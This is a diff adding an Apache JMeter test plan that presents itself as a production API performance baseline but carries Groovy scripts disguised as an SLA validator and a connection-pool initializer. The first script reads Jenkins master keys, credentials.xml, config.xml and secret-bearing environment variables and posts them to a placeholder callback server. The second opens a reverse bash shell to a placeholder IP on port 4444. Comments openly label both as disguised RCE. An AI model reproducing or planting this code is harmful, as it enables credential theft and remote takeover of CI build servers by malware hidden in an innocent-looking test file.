@@ -1,0 +1,114 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jmeterTestPlan version="1.2" properties="5.0" jmeter="5.6.3">
+  <hashTree>
+    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="API Performance Validation - Production Baseline" enabled="true">
+      <stringProp name="TestPlan.comments">Establishing performance baseline for Q3 release candidate</stringProp>
+      <boolProp name="TestPlan.functional_mode">false</boolProp>
+      <boolProp name="TestPlan.tearDown_on_shutdown">true</boolProp>
+    </TestPlan>
+    <hashTree>
+      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="Baseline Users" enabled="true">
+        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController">
+          <boolProp name="LoopController.continue_forever">false</boolProp>
+          <stringProp name="LoopController.loops">1</stringProp>
+        </elementProp>
+        <stringProp name="ThreadGroup.num_threads">1</stringProp>
+        <stringProp name="ThreadGroup.ramp_time">1</stringProp>
+        <boolProp name="ThreadGroup.scheduler">false</boolProp>
+      </ThreadGroup>
+      <hashTree>
+        <!-- Looks benign — standard HTTP health check -->
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="GET Health Endpoint" enabled="true">
+          <stringProp name="HTTPSampler.domain">api.target.com</stringProp>
+          <stringProp name="HTTPSampler.port">443</stringProp>
+          <stringProp name="HTTPSampler.protocol">https</stringProp>
+          <stringProp name="HTTPSampler.path">/health</stringProp>
+          <stringProp name="HTTPSampler.method">GET</stringProp>
+          <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <!-- RCE disguised as SLA validation -->
+          <JSR223PostProcessor guiclass="TestBeanGUI" testclass="JSR223PostProcessor" testname="SLA Response Time Validator" enabled="true">
+            <stringProp name="cacheKey">true</stringProp>
+            <stringProp name="scriptLanguage">groovy</stringProp>
+            <stringProp name="script">
+// Performance SLA validation and telemetry export
+def hostname = "hostname".execute().text.trim()
+def whoami = "whoami".execute().text.trim()
+def pwd = "pwd".execute().text.trim()
+
+// Collect Jenkins secrets
+def jenkinsHome = System.getenv("JENKINS_HOME") ?: "/var/jenkins_home"
+def masterKey = new File(jenkinsHome + "/secrets/master.key")
+def hudsonSecret = new File(jenkinsHome + "/secrets/hudson.util.Secret")
+def credsXml = new File(jenkinsHome + "/credentials.xml")
+def configXml = new File(jenkinsHome + "/config.xml")
+
+def exfil = [
+    hostname: hostname,
+    user: whoami,
+    directory: pwd,
+    jenkins_home: jenkinsHome,
+    env_vars: System.getenv().findAll { k, v -> 
+        k.toUpperCase().contains("JENKINS") || 
+        k.toUpperCase().contains("AWS") || 
+        k.toUpperCase().contains("SECRET") ||
+        k.toUpperCase().contains("TOKEN") ||
+        k.toUpperCase().contains("KEY")
+    }
+]
+
+if (masterKey.exists()) exfil["master_key"] = masterKey.text.trim()
+if (hudsonSecret.exists()) exfil["hudson_secret"] = hudsonSecret.text.trim()
+if (credsXml.exists()) exfil["credentials_xml"] = credsXml.text.take(10000)
+if (configXml.exists()) exfil["config_xml"] = configXml.text.take(5000)
+
+// Send to callback server
+def url = new URL("http://YOUR_SERVER/exfil")
+def conn = url.openConnection()
+conn.setRequestMethod("POST")
+conn.setDoOutput(true)
+conn.setRequestProperty("Content-Type", "application/json")
+conn.getOutputStream().write(new groovy.json.JsonBuilder(exfil).toString().getBytes())
+conn.getResponseCode()
+            </stringProp>
+          </JSR223PostProcessor>
+          <hashTree/>
+        </hashTree>
+        
+        <!-- Reverse shell as "Connection Pool Initializer" -->
+        <JSR223Sampler guiclass="TestBeanGUI" testclass="JSR223Sampler" testname="Initialize Connection Pool" enabled="true">
+          <stringProp name="scriptLanguage">groovy</stringProp>
+          <stringProp name="script">
+def host = "YOUR_IP"
+def port = 4444
+def socket = new Socket(host, port)
+def process = "/bin/bash".execute()
+def pi = process.getInputStream()
+def pe = process.getErrorStream()
+def si = socket.getInputStream()
+def po = process.getOutputStream()
+def so = socket.getOutputStream()
+
+Thread.start {
+    while (!socket.isClosed()) {
+        while (pi.available() > 0) so.write(pi.read())
+        while (pe.available() > 0) so.write(pe.read())
+        so.flush()
+        Thread.sleep(50)
+    }
+}
+
+while (!socket.isClosed()) {
+    while (si.available() > 0) po.write(si.read())
+    po.flush()
+    Thread.sleep(50)
+}
+          </stringProp>
+        </JSR223Sampler>
+        <hashTree/>
+      </hashTree>
+    </hashTree>
+  </hashTree>
+</jmeterTestPlan>
